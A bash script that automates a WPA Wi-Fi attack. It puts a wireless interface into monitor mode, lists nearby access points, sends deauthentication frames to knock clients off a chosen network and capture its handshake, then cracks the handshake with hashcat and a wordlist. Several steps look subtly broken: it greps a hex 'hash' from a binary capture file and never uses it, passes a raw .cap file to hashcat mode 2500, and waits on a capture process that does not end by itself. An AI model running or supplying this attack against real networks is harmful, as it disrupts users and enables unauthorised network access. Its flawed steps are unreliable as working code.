#!/bin/bash

set -e

# Check if running as root
if [ "$(id -u)" != "0" ]; then
  echo "Please run as root"
  exit 1
fi

# Check if aircrack-ng and hashcat are installed
if ! command -v airmon-ng &> /dev/null || ! command -v hashcat &> /dev/null; then
    echo "aircrack-ng or hashcat is not installed. Please install them."
    exit 1
fi

# Check if wireless interface is provided
if [ -z "$1" ]; then
    echo "Please provide a wireless interface name as argument (e.g. wlan0)"
    exit 1
fi

interface="$1"

# Put wireless interface into monitor mode
airmon-ng start "$interface"

# Scan for access points
echo "Scanning for access points..."
aps=$(airodump-ng mon0 --output-format csv --write /dev/shm/scan 2>&1 >/dev/null | awk -F ',' 'NR > 6 {print $1, $4, $6}')

# Check if any access points were found
if [ -z "$aps" ]; then
    echo "No access points found. Exiting."
    airmon-ng stop mon0
    exit 1
fi

# Display list of access points and prompt user to choose one
echo "Select an access point:"
PS3='> '
while IFS= read -r line; do
    aps_list+=("$line")
    echo "$line"
done <<< "$aps"
select ap in "${aps_list[@]}"; do
    if [ -n "$ap" ]; then
        bssid=$(echo "$ap" | awk '{print $1}')
        channel=$(echo "$ap" | awk '{print $2}')
        break
    fi
done

# Perform deauthentication attack to capture handshake
echo "Performing deauthentication attack on $bssid (channel $channel)..."
aireplay-ng --deauth 10 -a "$bssid" mon0 &

# Start capturing handshakes for target network
echo "Capturing handshakes for $bssid (channel $channel)..."
airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0 &
capture_pid=$!

# Wait for handshake capture to complete
if ! wait "$capture_pid"; then
    echo "Error: Handshake capture failed. Exiting."
    pkill aireplay-ng
    airmon-ng stop mon0
    exit 1
fi

# Stop deauthentication attack
pkill aireplay-ng

# Extract hash from handshake file
hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake-01.cap | head -n 1)

if [ -z "$hash" ]; then
    echo "Error: Hash not found in handshake file. Exiting."
    airmon-ng stop mon0
    exit 1
fi

# Ask user for wordlist to use for cracking
while true; do
    read -r -p "Please enter the path to the wordlist to use for cracking: " wordlist
    if [ -f "$wordlist" ]; then
        break
    else
        echo "Error: File not found. Please enter a valid path."
    fi
done

# Crack the hash using hashcat
echo "Cracking hash..."
hashcat -m 2500 handshake-01.cap "$wordlist"

# Stop monitor mode
airmon-ng stop mon0

